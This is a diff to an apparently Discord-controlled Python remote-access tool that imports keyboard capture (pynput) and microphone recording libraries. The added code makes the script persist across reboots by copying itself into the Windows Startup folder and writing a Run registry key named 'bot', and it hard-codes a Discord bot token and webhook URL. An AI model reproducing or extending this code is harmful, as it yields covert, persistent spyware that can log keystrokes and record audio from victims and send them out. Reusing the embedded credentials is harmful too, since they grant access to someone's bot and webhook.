@@ -12,10 +12,39 @@ import pynput
 import webbrowser
 import sounddevice as sd
 from scipy.io.wavfile import write
+import shutil
+import winreg as reg
 
 
-TOKEN = ""
-WEBHOOK_URL = ""
+def add_to_startup():
+    # Get the current script's path
+    script_path = os.path.abspath(__file__)
+
+    # Get the user's startup folder
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+
+    # Copy the script to the startup folder
+    shutil.copy(script_path, startup_folder)
+
+    # Add a registry entry for the script
+    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    value_name = "bot"
+    value_data = script_path
+
+    try:
+        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
+        reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, value_data)
+        reg.CloseKey(reg_key)
+        print(f"Script added to startup successfully.")
+    except Exception as e:
+        print(f"Error adding script to startup: {e}")
+
+if __name__ == "__main__":
+    add_to_startup()
+
+
+TOKEN = "MTE5OTIwNDE5MzkyMDA5NDI3OQ.GDCA5Q.vQWZqAKShOHV43vEXioASreWJRqK1stosu4xBo"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1199232245064544446/zw-KJgseC3OYaxYYN9okGzZJ3Y3tut2o24TcO1z_xG91KRV1ad3OUV54mE5ioj9UA5oZ"
 
 intents = discord.Intents.default()
 intents.message_content = True
